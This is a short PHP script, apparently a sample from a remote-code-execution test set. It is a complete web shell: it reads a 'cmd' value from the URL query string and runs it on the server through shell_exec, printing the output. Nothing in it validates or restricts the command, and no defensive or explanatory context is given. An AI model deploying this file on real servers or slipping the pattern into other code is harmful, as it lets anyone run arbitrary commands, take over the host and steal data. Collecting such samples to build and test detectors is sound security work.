<?php
// RCE test variation #119
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>